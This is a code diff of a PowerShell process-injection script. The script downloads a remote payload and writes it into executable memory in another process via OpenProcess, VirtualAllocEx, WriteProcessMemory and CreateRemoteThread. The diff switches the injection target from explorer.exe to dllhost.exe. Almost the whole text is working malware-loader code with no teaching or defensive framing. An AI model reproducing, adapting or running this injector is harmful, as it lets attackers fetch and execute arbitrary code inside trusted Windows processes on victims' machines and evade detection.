@@ -8,7 +8,7 @@ Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing
 # Read payload bytes
 $payload = [System.IO.File]::ReadAllBytes($payloadPath)
 
-# Add P/Invoke with necessary functions for injection
+# Add P/Invoke with necessary WinAPI functions
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -31,31 +31,33 @@ public class Injector {
 }
 "@
 
-# Desired access flags for OpenProcess
+# Constants
 $PROCESS_ALL_ACCESS = 0x001F0FFF
-
-# Find explorer.exe process
-$explorer = Get-Process explorer -ErrorAction Stop | Select-Object -First 1
-if (-not $explorer) {
-    Write-Error "[-] explorer.exe process not found."
-    exit
-}
-
-# Open handle to explorer.exe
-$hProcess = [Injector]::OpenProcess($PROCESS_ALL_ACCESS, $false, $explorer.Id)
-if ($hProcess -eq [IntPtr]::Zero) {
-    Write-Error "[-] Failed to open explorer.exe process."
-    exit
-}
-
-# Allocate memory in explorer.exe process
 $MEM_COMMIT = 0x1000
 $MEM_RESERVE = 0x2000
 $PAGE_EXECUTE_READWRITE = 0x40
 
+# Find dllhost.exe process
+$dllhostProcesses = Get-Process dllhost -ErrorAction SilentlyContinue
+if (-not $dllhostProcesses) {
+    Write-Error "[-] No dllhost.exe process found."
+    exit
+}
+
+$targetProcess = $dllhostProcesses | Select-Object -First 1
+Write-Host "[*] Selected dllhost.exe with PID $($targetProcess.Id) for injection."
+
+# Open handle to dllhost.exe
+$hProcess = [Injector]::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetProcess.Id)
+if ($hProcess -eq [IntPtr]::Zero) {
+    Write-Error "[-] Failed to open dllhost.exe process."
+    exit
+}
+
+# Allocate memory in target process
 $baseAddress = [Injector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$payload.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
 if ($baseAddress -eq [IntPtr]::Zero) {
-    Write-Error "[-] Failed to allocate memory in explorer.exe."
+    Write-Error "[-] Failed to allocate memory in dllhost.exe."
     [Injector]::CloseHandle($hProcess) | Out-Null
     exit
 }
@@ -64,7 +66,7 @@ if ($baseAddress -eq [IntPtr]::Zero) {
 $bytesWritten = [UIntPtr]::Zero
 $writeResult = [Injector]::WriteProcessMemory($hProcess, $baseAddress, $payload, [uint32]$payload.Length, [ref]$bytesWritten)
 if (-not $writeResult -or $bytesWritten.ToUInt32() -ne $payload.Length) {
-    Write-Error "[-] Failed to write payload to explorer.exe memory."
+    Write-Error "[-] Failed to write payload to dllhost.exe memory."
     [Injector]::CloseHandle($hProcess) | Out-Null
     exit
 }
@@ -72,13 +74,13 @@ if (-not $writeResult -or $bytesWritten.ToUInt32() -ne $payload.Length) {
 # Create remote thread to execute payload
 $hThread = [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $baseAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 if ($hThread -eq [IntPtr]::Zero) {
-    Write-Error "[-] Failed to create remote thread in explorer.exe."
+    Write-Error "[-] Failed to create remote thread in dllhost.exe."
     [Injector]::CloseHandle($hProcess) | Out-Null
     exit
 }
 
-Write-Host "[+] Injection into explorer.exe completed successfully."
+Write-Host "[+] Injection into dllhost.exe completed successfully."
 
-# Close handles
+# Clean up handles
 [Injector]::CloseHandle($hThread) | Out-Null
 [Injector]::CloseHandle($hProcess) | Out-Null
